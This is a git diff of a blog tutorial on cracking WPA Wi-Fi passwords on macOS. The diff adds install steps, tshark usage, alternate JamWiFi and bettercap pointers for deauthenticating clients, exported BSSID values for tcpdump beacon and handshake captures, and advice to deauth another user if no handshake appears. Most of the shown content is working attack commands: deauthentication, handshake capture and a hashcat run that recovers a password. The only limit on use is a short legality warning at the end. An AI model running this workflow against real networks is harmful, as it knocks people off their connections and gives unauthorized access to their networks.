@@ -9,6 +9,8 @@ excerpt: >-
 categories: sysad
 tags: wifi security linux macos
 toc: true
+last_modified_at: 2022-09-25T00:00:00-00:00
+
 # header:
 #   teaser: /assets/images/selenium/selenium_python_logo.png
 #   og_image: /assets/images/selenium/selenium_python_logo.png
@@ -27,9 +29,15 @@ I want to save the instruction to the future. If you want to repeat it you shoul
 
 Let's start cracking ;)
 
+## prerequisites
+
 ## installation requirements
 
-1. Install [Homebrew](https://brew.sh/)
+1. You need the [Homebrew](https://brew.sh/) package manager installed. If you don’t have it, use the one-liner below to install it. It will also install Xcode command line tools and all necessary dependencies. You will need to enter your administrator password and it will take up to 5 minutes:
+
+```
+/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+```
 
 2. Install [aircrack-ng][aircrack]
 ```
@@ -51,7 +59,7 @@ brew install hashcat
 git clone https://github.com/hashcat/hashcat-utils.git
 cd hashcat-utils/src
 gcc -o cap2hccapx cap2hccapx.c
-mv ./cap2hccapx /usr/local/bin/
+sudo mv ./cap2hccapx /usr/local/bin/
 ```
 
 6. Install [hcxtools][hcxtools]
@@ -59,12 +67,12 @@ mv ./cap2hccapx /usr/local/bin/
 brew install hcxtools
 ```
 
-7. Install [wireshark][wireshark]
+7. Install [wireshark][wireshark]. We will use a console version - [tshark][tshark]
 ```
 brew install wireshark
 ```
 
-8. Install [JamWifi](https://github.com/0x0XDev/JamWiFi) app. It is a deauthenticating application in which unwanted clients from a Wi-Fi network have to keep off, jamming and especially their connection will be departed like dust in a second. Download and unzip by [this][jamwifi] link.
+8. Install [JamWifi](https://github.com/0x0XDev/JamWiFi) app. It is a deauthenticating application in which unwanted clients from a Wi-Fi network have to keep off, jamming and especially their connection will be departed like dust in a second. Download and unzip by [this][jamwifi] link (or [this](http://macheads101.com/pages/downloads/mac.php)).
 
 9. Test that all tools installed and available. The commands below should success return some help page about itself:
 ```
@@ -74,7 +82,7 @@ cap2hccapx -h
 hashcat -h
 hcxhash2cap -h
 tcpdump -h
-wireshark -h
+tshark -h
 ```
 
 ## identify the target access point
@@ -122,27 +130,33 @@ Ethernet Address: .......
 sudo airport -z
 ```
 
-3. Set the channel. Do not put a space between `-c` and the channel
+3. Set the channel. The number of channel is that we see before onthe result of scanning network. Do not put a space between `-c` and the channel
 ```
 sudo airport -c1
 ```
 
 4. Capture a **beacon** frame from the access point. This command will create a new file `beacon.cap`, which is the gathered data from the target access point.
-```
+```bash
+export BSSID=6e:57:ca:24:09:8c
 sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap
 ```
 
 5. Deauth connected devices with **Jam Wi-Fi** app. Open the app. Press **Scan**, chose the target network and press **Monitor**, then press **Do It!** to restart all connections. Wait 15 seconds and press **Done**
 [![deauth-clients]({{ site.baseurl }}/assets/images/wifi-crack/jamwifi.png)]({{ site.baseurl }}/assets/images/wifi-crack/jamwifi.png){: .align-center}
 
-6. When you "Done" with death, run quickly next command. You have to capture a **handshake** in time
-```
+> NOTE: It seeams that Jam Wi-Fi was unsupported by author. I recommend use `bettercap` and [this manual][bettercap-article] to deauth clients if you have trouble to run Jam Wi-Fi.
+
+1. When you "Done" with death, run quickly next command. You have to capture a **handshake** in time
+```bash
+export BSSID=6e:57:ca:24:09:8c
 sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
 ```
 Wait until you see some gotten frames, like this
 ```
 Got 19
 ```
+When tcpdump shows you it got 4 frames or more. It appears you can use less that 4 frames, but it depends on the frames you got (for instance 1,2 or 2,3 are sufficient). Anyway you should normally get at least 4. If nothing shows, try to deauth another user.
+
 After you have it press `"Control + C"` to stop capturing.
 
 7. Merge the Beacon and Handshake
@@ -228,7 +242,7 @@ Candidates.#2....: 32303174 -> 31682841
 Candidates.#3....: 18328292 -> 15530236
 
 Started: Fri Jul 17 18:11:13 2020
-Stopped: Fri Jul 17 18:31:39 2020                           
+Stopped: Fri Jul 17 18:31:39 2020
 ```
 
 Is true that my network named `Ruslan Gainanov` has a password - `12345670`.
@@ -253,3 +267,5 @@ Please be aware that attacking Wi-Fi Protected Access (WPA) is illegal unless yo
 [wireshark]: https://www.wireshark.org/
 [hcxtools]: https://github.com/ZerBea/hcxtools
 [jamwifi]: http://macheads101.com/pages/downloads/mac/JamWiFi.app.zip
+[tshark]: https://www.wireshark.org/docs/wsug_html_chunked/AppToolstshark.html#:~:text=TShark%20is%20a%20terminal%20oriented,tshark%20)%20or%20the%20online%20version.
+[bettercap-article]: {% post_url 2022-09-25-wifi-deauth-attack.md %}
